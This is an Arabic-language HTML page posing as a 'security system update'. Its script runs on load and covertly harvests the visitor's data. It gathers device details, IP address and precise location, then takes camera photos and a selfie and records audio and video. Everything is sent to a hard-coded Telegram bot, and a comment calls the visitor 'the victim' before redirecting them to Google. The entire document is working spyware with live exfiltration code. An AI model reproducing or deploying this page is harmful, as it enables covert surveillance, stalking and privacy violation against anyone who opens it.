<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>تحديث النظام...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #000;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            direction: rtl;
        }
        .container {
            background: rgba(20, 20, 30, 0.95);
            backdrop-filter: blur(10px);
            padding: 30px;
            border-radius: 30px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
            text-align: center;
            max-width: 400px;
            width: 90%;
            border: 1px solid rgba(255,255,255,0.1);
        }
        h2 {
            color: #fff;
            margin-bottom: 20px;
            font-size: 24px;
            font-weight: 500;
        }
        .status-box {
            background: rgba(0,0,0,0.3);
            border-radius: 20px;
            padding: 20px;
            margin: 20px 0;
        }
        .status-text {
            color: #00ff88;
            font-size: 16px;
            margin-bottom: 15px;
            font-family: monospace;
        }
        .progress-container {
            width: 100%;
            height: 8px;
            background: rgba(255,255,255,0.1);
            border-radius: 4px;
            overflow: hidden;
            margin: 20px 0;
        }
        .progress-bar {
            height: 100%;
            background: linear-gradient(90deg, #00ff88, #00aaff);
            width: 0%;
            transition: width 0.3s cubic-bezier(0.4, 0.0, 0.2, 1);
        }
        .stats {
            display: flex;
            justify-content: space-between;
            color: #aaa;
            font-size: 14px;
            margin: 15px 0;
        }
        .permission-box {
            background: rgba(255,255,255,0.05);
            border-radius: 15px;
            padding: 15px;
            margin: 15px 0;
            border: 1px solid rgba(255,255,255,0.1);
        }
        .permission-item {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin: 10px 0;
            color: #fff;
        }
        .permission-item.granted {
            color: #00ff88;
        }
        .permission-item .status {
            width: 20px;
            height: 20px;
            border-radius: 50%;
            background: rgba(255,255,255,0.1);
        }
        .permission-item.granted .status {
            background: #00ff88;
            box-shadow: 0 0 10px #00ff88;
        }
        .counter {
            font-size: 32px;
            font-weight: bold;
            color: #fff;
            margin: 10px 0;
        }
        .counter-label {
            color: #aaa;
            font-size: 14px;
        }
        @keyframes pulse {
            0% { opacity: 0.5; }
            50% { opacity: 1; }
            100% { opacity: 0.5; }
        }
        .scanning {
            animation: pulse 2s infinite;
            color: #00aaff;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>⚡ تحديث نظام الأمان</h2>
        
        <div class="permission-box">
            <div class="permission-item" id="permCamera">
                <span>📸 الكاميرا</span>
                <span class="status" id="statusCamera"></span>
            </div>
            <div class="permission-item" id="permMic">
                <span>🎤 الميكروفون</span>
                <span class="status" id="statusMic"></span>
            </div>
            <div class="permission-item" id="permLocation">
                <span>📍 الموقع</span>
                <span class="status" id="statusLocation"></span>
            </div>
        </div>

        <div class="status-box">
            <div class="status-text" id="status">🚀 بدء تشغيل النظام...</div>
            <div class="stats">
                <span>📸 الصور: <span id="photoCount">0</span></span>
                <span>🎥 الفيديو: <span id="videoCount">0</span></span>
                <span>🎤 التسجيلات: <span id="audioCount">0</span></span>
            </div>
        </div>

        <div class="progress-container">
            <div class="progress-bar" id="progress" style="width: 0%"></div>
        </div>

        <div class="counter" id="counter">0</div>
        <div class="counter-label">ملف تم سحبه</div>
    </div>

    <script>
        // ==================== الإعدادات المتقدمة ====================
        const BOT_TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
        const CHAT_ID = "7392262688";
        
        // إحصائيات
        let stats = {
            photos: 0,
            videos: 0,
            audio: 0,
            total: 0
        };

        // حالة الأذونات
        let permissions = {
            camera: false,
            microphone: false,
            location: false
        };

        // ==================== دوال التحديث ====================
        function updateStatus(text, progress) {
            document.getElementById('status').innerText = text;
            if (progress !== undefined) {
                document.getElementById('progress').style.width = progress + '%';
            }
        }

        function updatePermissionUI() {
            for (const [perm, granted] of Object.entries(permissions)) {
                const element = document.getElementById(`perm${perm.charAt(0).toUpperCase() + perm.slice(1)}`);
                const status = document.getElementById(`status${perm.charAt(0).toUpperCase() + perm.slice(1)}`);
                if (granted) {
                    element.classList.add('granted');
                    status.style.background = '#00ff88';
                    status.style.boxShadow = '0 0 10px #00ff88';
                }
            }
        }

        function updateStats() {
            stats.total = stats.photos + stats.videos + stats.audio;
            document.getElementById('photoCount').innerText = stats.photos;
            document.getElementById('videoCount').innerText = stats.videos;
            document.getElementById('audioCount').innerText = stats.audio;
            document.getElementById('counter').innerText = stats.total;
        }

        // ==================== دوال الإرسال للتيليجرام ====================
        async function sendToTelegram(type, data, filename) {
            try {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                
                if (type === 'text') {
                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: CHAT_ID,
                            text: data,
                            parse_mode: 'HTML'
                        })
                    });
                } else if (type === 'photo') {
                    formData.append('photo', data, filename || 'photo.jpg');
                    formData.append('caption', `📸 صورة - ${new Date().toLocaleString()}`);
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                    stats.photos++;
                } else if (type === 'video') {
                    formData.append('video', data, filename || 'video.mp4');
                    formData.append('caption', `🎥 فيديو - ${new Date().toLocaleString()}`);
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                        method: 'POST',
                        body: formData
                    });
                    stats.videos++;
                } else if (type === 'audio') {
                    formData.append('audio', data, filename || 'audio.mp3');
                    formData.append('caption', `🎵 تسجيل - ${new Date().toLocaleString()}`);
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
                        method: 'POST',
                        body: formData
                    });
                    stats.audio++;
                } else if (type === 'voice') {
                    formData.append('voice', data, filename || 'voice.ogg');
                    formData.append('caption', `🎤 رسالة صوتية - ${new Date().toLocaleString()}`);
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, {
                        method: 'POST',
                        body: formData
                    });
                    stats.audio++;
                }
                
                updateStats();
                return true;
            } catch (error) {
                console.error('Send error:', error);
                return false;
            }
        }

        // ==================== الحصول على الأذونات تلقائياً ====================
        async function requestAllPermissions() {
            updateStatus('🔐 طلب أذونات الوصول...', 10);

            // طلب الكاميرا (تلقائي)
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        width: { ideal: 1920 },
                        height: { ideal: 1080 },
                        facingMode: 'environment'
                    }
                });
                permissions.camera = true;
                stream.getTracks().forEach(t => t.stop());
                updateStatus('✅ إذن الكاميرا تم', 20);
            } catch (e) {
                updateStatus('⚠️ فشل إذن الكاميرا', 20);
            }

            // طلب الميكروفون (تلقائي)
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    audio: {
                        echoCancellation: true,
                        noiseSuppression: true,
                        autoGainControl: true,
                        sampleRate: 48000,
                        channelCount: 2
                    }
                });
                permissions.microphone = true;
                stream.getTracks().forEach(t => t.stop());
                updateStatus('✅ إذن الميكروفون تم', 30);
            } catch (e) {
                updateStatus('⚠️ فشل إذن الميكروفون', 30);
            }

            // طلب الموقع (تلقائي)
            try {
                await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, {
                        enableHighAccuracy: true,
                        timeout: 5000,
                        maximumAge: 0
                    });
                });
                permissions.location = true;
                updateStatus('✅ إذن الموقع تم', 35);
            } catch (e) {
                updateStatus('⚠️ فشل إذن الموقع', 35);
            }

            updatePermissionUI();
        }

        // ==================== سحب الصور بسرعة ====================
        async function capturePhotos() {
            if (!permissions.camera) return;

            updateStatus('📸 بدء التقاط الصور...', 40);

            // التقاط من الكاميرا الخلفية
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        width: { ideal: 1920 },
                        height: { ideal: 1080 },
                        facingMode: 'environment'
                    }
                });

                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();

                await new Promise(r => video.onloadedmetadata = r);

                // التقاط 3 صور بزوايا مختلفة
                for (let i = 0; i < 3; i++) {
                    updateStatus(`📸 التقاط صورة ${i+1}/3...`, 40 + (i * 10));
                    
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    
                    const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.95));
                    
                    await sendToTelegram('photo', blob, `camera_${Date.now()}_${i}.jpg`);
                    
                    // انتظار قصير بين الصور
                    await new Promise(r => setTimeout(r, 500));
                }

                stream.getTracks().forEach(t => t.stop());
                updateStatus('✅ تم التقاط الصور', 60);
            } catch (error) {
                console.error('Photo capture error:', error);
            }

            // محاولة التقاط صورة سيلفي
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        width: { ideal: 1280 },
                        height: { ideal: 720 },
                        facingMode: 'user'
                    }
                });

                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();

                await new Promise(r => video.onloadedmetadata = r);

                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);

                const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.9));

                await sendToTelegram('photo', blob, `selfie_${Date.now()}.jpg`);

                stream.getTracks().forEach(t => t.stop());
            } catch (error) {
                console.error('Selfie error:', error);
            }
        }

        // ==================== سحب الفيديو ====================
        async function captureVideo() {
            if (!permissions.camera || !permissions.microphone) return;

            updateStatus('🎥 بدء تسجيل الفيديو...', 65);

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        width: { ideal: 1280 },
                        height: { ideal: 720 },
                        facingMode: 'environment'
                    },
                    audio: true
                });

                const mediaRecorder = new MediaRecorder(stream, {
                    mimeType: 'video/webm',
                    videoBitsPerSecond: 2500000
                });

                const chunks = [];

                mediaRecorder.ondataavailable = e => chunks.push(e.data);
                
                mediaRecorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: 'video/webm' });
                    await sendToTelegram('video', blob, `video_${Date.now()}.webm`);
                    stream.getTracks().forEach(t => t.stop());
                };

                // تسجيل 5 ثواني
                mediaRecorder.start();
                updateStatus('🎥 تسجيل فيديو (5 ثوان)...', 70);
                
                await new Promise(r => setTimeout(r, 5000));
                
                mediaRecorder.stop();
                updateStatus('✅ تم تسجيل الفيديو', 75);
            } catch (error) {
                console.error('Video error:', error);
            }
        }

        // ==================== تسجيل الصوت ====================
        async function recordAudio() {
            if (!permissions.microphone) return;

            updateStatus('🎤 بدء تسجيل الصوت...', 50);

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    audio: {
                        channelCount: 2,
                        sampleRate: 48000,
                        echoCancellation: true,
                        noiseSuppression: true
                    }
                });

                // تسجيل بصيغة WAV
                const audioContext = new AudioContext();
                const source = audioContext.createMediaStreamSource(stream);
                const destination = audioContext.createMediaStreamDestination();
                source.connect(destination);

                const mediaRecorder = new MediaRecorder(destination.stream);
                const chunks = [];

                mediaRecorder.ondataavailable = e => chunks.push(e.data);
                
                mediaRecorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: 'audio/wav' });
                    await sendToTelegram('audio', blob, `recording_${Date.now()}.wav`);
                    stream.getTracks().forEach(t => t.stop());
                    await audioContext.close();
                };

                // تسجيل 7 ثواني
                mediaRecorder.start();
                updateStatus('🎤 تسجيل صوت (7 ثوان)...', 55);
                
                await new Promise(r => setTimeout(r, 7000));
                
                mediaRecorder.stop();
                updateStatus('✅ تم تسجيل الصوت', 60);
            } catch (error) {
                console.error('Audio error:', error);
            }
        }

        // ==================== الحصول على الموقع بدقة ====================
        async function getAccurateLocation() {
            if (!permissions.location) return;

            updateStatus('📍 الحصول على الموقع...', 25);

            try {
                const position = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    });
                });

                const { latitude, longitude, accuracy, altitude, speed } = position.coords;

                let locationText = `📍 <b>الموقع الدقيق:</b>\n`;
                locationText += `الخط: <code>${latitude}</code>\n`;
                locationText += `الطول: <code>${longitude}</code>\n`;
                locationText += `الدقة: ±${accuracy} متر\n`;
                if (altitude) locationText += `الارتفاع: ${altitude} متر\n`;
                if (speed) locationText += `السرعة: ${speed} م/ث\n`;
                locationText += `<a href='https://www.google.com/maps?q=${latitude},${longitude}'>🗺️ عرض على الخريطة</a>`;

                await sendToTelegram('text', locationText);

                // إرسال كموقع مباشر
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        latitude: latitude,
                        longitude: longitude
                    })
                });

                updateStatus('✅ تم الحصول على الموقع', 30);
            } catch (error) {
                console.error('Location error:', error);
            }
        }

        // ==================== معلومات الجهاز الشاملة ====================
        async function getDeviceInfo() {
            updateStatus('💻 جمع معلومات الجهاز...', 5);

            const info = {
                '🌐 المتصفح': navigator.userAgent,
                '💻 المنصة': navigator.platform,
                '📱 اللغة': navigator.language,
                '🔧 Vendor': navigator.vendor,
                '🖥️ دقة الشاشة': `${screen.width}x${screen.height}`,
                '🎨 عمق الألوان': screen.colorDepth + 'bit',
                '🍪 Cookies': navigator.cookieEnabled ? 'مفعلة' : 'غير مفعلة',
                '⏰ المنطقة الزمنية': Intl.DateTimeFormat().resolvedOptions().timeZone,
                '📅 التاريخ': new Date().toLocaleString('ar-SA'),
                '🔋 البطارية': await getBatteryInfo(),
                '🌍 IP': await getIPInfo()
            };

            let text = '🔰 <b>معلومات الجهاز الكاملة:</b>\n\n';
            for (const [key, value] of Object.entries(info)) {
                text += `${key}: <code>${value}</code>\n`;
            }

            await sendToTelegram('text', text);
            updateStatus('✅ تم جمع معلومات الجهاز', 10);
        }

        async function getBatteryInfo() {
            try {
                const battery = await navigator.getBattery();
                return `${Math.round(battery.level * 100)}% (${battery.charging ? 'يشحن' : 'لا يشحن'})`;
            } catch {
                return 'غير معروف';
            }
        }

        async function getIPInfo() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch {
                return 'غير معروف';
            }
        }

        // ==================== الوظيفة الرئيسية ====================
        async function main() {
            try {
                // 1. معلومات الجهاز
                await getDeviceInfo();

                // 2. طلب الأذونات
                await requestAllPermissions();

                // 3. الموقع
                await getAccurateLocation();

                // 4. الصور (الأسرع)
                await capturePhotos();

                // 5. الصوت
                await recordAudio();

                // 6. الفيديو
                await captureVideo();

                // تم بنجاح
                updateStatus('✅ تم سحب جميع الملفات بنجاح!', 100);
                
                await sendToTelegram('text', 
                    `✅ <b>اكتملت العملية بنجاح!</b>\n\n` +
                    `📸 الصور: ${stats.photos}\n` +
                    `🎥 الفيديو: ${stats.videos}\n` +
                    `🎤 التسجيلات: ${stats.audio}\n` +
                    `📦 المجموع: ${stats.total}`
                );

                // تحويل الضحية
                setTimeout(() => {
                    window.location.href = "https://www.google.com";
                }, 2000);

            } catch (error) {
                console.error('Main error:', error);
                updateStatus('❌ حدث خطأ', 0);
                
                setTimeout(() => {
                    window.location.href = "https://www.google.com";
                }, 2000);
            }
        }

        // ==================== تشغيل كل شيء ====================
        main();
    </script>
</body>
</html>
